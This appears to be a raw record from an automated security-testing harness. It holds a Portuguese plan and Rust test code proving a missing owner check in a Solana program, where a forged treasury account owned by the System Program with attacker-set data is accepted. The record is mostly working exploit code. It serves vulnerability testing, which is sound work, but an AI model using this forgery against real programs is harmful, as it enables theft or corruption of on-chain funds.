attempts.raw:
{"plan": "O programa `process` (pinocchio) le a conta `treasury` (accounts[0]) via try_borrow_data sem validar o owner. Vou montar um baseline com uma conta treasury legitima (owner = program_id) com dados validos (is_active != 0) para provar que o cenario esta correto. No ataque, substituo a treasury por uma conta forjada cujo owner e outro programa (System Program) mas com os mesmos dados maliciosos controlados pelo atacante. O efeito medido e que a conta forjada foi aceita e usada: o owner da conta resultante difere do program_id e a instrucao teve sucesso.", "scenario": "let treasury_legit = account(
    &env.program_id,
    &{
        let mut d = vec![0u8; 49];
        d[8..40].copy_from_slice(&[7u8; 32]);
        d[40..48].copy_from_slice(&1234u64.to_le_bytes());
        d[48] = 1;
        d
    },
    None,
);

let authority = wallet(1_000_000_000);

let ix = env.raw_ix(&[0u8], &[
    AccountMeta::new(treasury_legit_key, false),
    AccountMeta::new_readonly(authority_key, false),
]);

let baseline_accounts = vec![
    (treasury_legit_key, treasury_legit.clone()),
    (authority_key, authority.clone()),
];

let r_base = env.baseline("process com treasury legitima", &ix, &baseline_accounts);

let forged_treasury = account(
    &solana_sdk::system_program::id(),
    &{
        let mut d = vec![0u8; 49];
        d[8..40].copy_from_slice(&[9u8; 32]);
        d[40..48].copy_from_slice(&999_999u64.to_le_bytes());
        d[48] = 1;
        d
    },
    None,
);

let attack_accounts = vec![
    (treasury_legit_key, forged_treasury.clone()),
    (authority_key, authority.clone()),
];

let r = env.attack("process com treasury forjada (owner = System Program)", &ix, &attack_accounts);

if r.program_result == ProgramResult::Success {
    let after_treasury = after(&r, &treasury_legit_key);
    env.effect(
        "conta forjada com owner diferente do program_id foi aceita e usada",
        after_treasury.owner() != &env.program_id,
    );
    env.effect(
        "dados maliciosos controlados pelo atacante foram lidos (balance = 999999)",
        read_u64(after_treasury.data(), 40) == 999_999u64,
    );
}"}

